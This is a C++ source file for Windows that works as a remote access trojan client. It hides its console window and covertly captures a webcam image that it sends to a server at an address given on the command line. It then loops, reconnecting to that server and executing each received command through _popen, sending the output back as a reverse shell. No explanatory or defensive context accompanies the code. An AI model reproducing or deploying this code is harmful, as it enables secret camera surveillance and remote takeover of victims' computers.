// #include <unistd.h>
// #include <sys/stat.h>
// #include <fcntl.h>
#include <iostream>
// #include <cstdlib>
// #include <sys/socket.h>
// #include <netinet/in.h>
// #include <arpa/inet.h>
#include <cstdio>
#include <string>
#include <cstring>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <chrono>
#include <opencv2/opencv.hpp>
#include <thread>

// void deamonize(){
//     pid_t pid = fork();
//     if(pid < 0) exit(1);
//     if(pid > 0) exit(0);

//     if(setsid() < 0) exit(1);
    
//     pid = fork();
//     if(pid < 0) exit(1);
//     if(pid > 0) exit(0);

//     umask(0);
//     if(chdir("/") < 0) exit(1);

//     int fd = open("/dev/null", O_RDWR);
//     if(fd >= 0) {
//         dup2(fd, STDIN_FILENO);
//         dup2(fd, STDOUT_FILENO);
//         dup2(fd, STDERR_FILENO);
//         if(fd > 2) close(fd);
//     }
// }

#pragma comment(lib, "ws2_32.lib")

SOCKET establish_connection(const char* ip, int port){
    // while(true) {
    //     int sock = socket(AF_INET, SOCK_STREAM, 0);
    //     if (sock < 0) {
    //         sleep(10);
    //         continue;
    //     }

    //     struct sockaddr_in addr;
    //     addr.sin_family = AF_INET;      
    //     addr.sin_port = htons(port);

    //     if(inet_pton(AF_INET, ip, &addr.sin_addr) <= 0){
    //         close(sock);
    //         sleep(10);
    //         continue;
    //     }
    //     if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0){
    //         std::cerr << "Connection error" << std::endl;
    //         close(sock);
    //         sleep(5);
    //         continue;
    //     } else {
    //         return sock;
    //     }
    // }

    while(true) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if(sock == INVALID_SOCKET){
            Sleep(10000);
            continue;
        }
        struct sockaddr_in addr;
        addr.sin_family= AF_INET;
        addr.sin_port = htons(port);

        if(inet_pton(AF_INET, ip,&addr.sin_addr) <= 0) {
            closesocket(sock);
            Sleep(10000);
            continue;
        }
        if(connect(sock , (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
            std::cerr << "Connection error" << std::endl;
            closesocket(sock);
            Sleep(5000);
            continue;
        }else{
            return sock;
        }
    }
}

void handle_server_commands(SOCKET sock){
    while (true) {
        char buffer[1024] = {0};
        
        // ssize_t received_bytes = recv(sock, buffer, sizeof(buffer) - 1, 0); 
        int received_bytes = recv(sock, buffer, sizeof(buffer) - 1, 0); 
        
        if (received_bytes <= 0) {
            std::cerr << "Server disconnected" << std::endl;
            // close(sock);
            closesocket(sock);
            return; 
        }
           
        buffer[received_bytes] = '\0';

        while (received_bytes > 0 && (buffer[received_bytes - 1] == '\n' || buffer[received_bytes - 1] == '\r')) {
            buffer[received_bytes - 1] = '\0';
            received_bytes--;
        }

        if(received_bytes == 0) continue;

        if (strcmp(buffer, "exit") == 0) {
            // close(sock);
            closesocket(sock);
            exit(0);
        }

        std::string response = "";
        // FILE* pipe = popen(buffer, "r");
        FILE* pipe = _popen(buffer, "r");
        
        if(!pipe) {
            response = "Failed to execute command \n";
        } else {
            char tmp_buffer[256];
            while(fgets(tmp_buffer, sizeof(tmp_buffer), pipe) != NULL) {
                response += tmp_buffer;
            }
            // pclose(pipe);
            _pclose(pipe);
        }

        if (response.empty()) { 
            response = "Command executed \n";
        }

        send(sock, response.c_str(), response.length(), 0);
    }
}

#include <iostream>
#include <vector>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <opencv2/opencv.hpp>

int main(int argc, char* argv[]) {
    ShowWindow(GetConsoleWindow(), SW_HIDE); 

    WSAData wsaData; 
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed" << std::endl;
        return 1;
    }

    cv::VideoCapture cap(0);
    if(!cap.isOpened()) {
        std::cerr << "Error opening camera" << std::endl;
        WSACleanup();
        return -1;
    }

    std::vector<uchar> buffer;
    cv::Mat frame;
    for(int i = 0; i < 5; ++i){
        cap >> frame;
    }
    cv::imencode(".jpg", frame, buffer);
    cap.release();

    SOCKET clientsock = socket(AF_INET, SOCK_STREAM, 0);
    if (clientsock == INVALID_SOCKET) {
        std::cerr << "Socket error" << std::endl;
        WSACleanup();
        return 1;
    }

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(8080);
    const char* target_ip = (argc > 1) ? argv[1] : "127.0.0.1";
    inet_pton(AF_INET, target_ip, &addr.sin_addr);

    int connResult = connect(clientsock, (struct sockaddr*)&addr, sizeof(addr));
    if(connResult == SOCKET_ERROR) {
        closesocket(clientsock);
        WSACleanup();
        return 1;
    }

    int image_size = buffer.size();
    send(clientsock, (const char*)&image_size, sizeof(image_size), 0);

    send(clientsock, (const char*)buffer.data(), buffer.size(), 0);

    closesocket(clientsock);

    const char* server_ip = (argc > 1) ? argv[1] : "127.0.0.1";
    int server_port = 8080;

    while(true) {
        SOCKET active_socket = establish_connection(server_ip, server_port);
        handle_server_commands(active_socket);
    }

    WSACleanup();
    return 0;
}
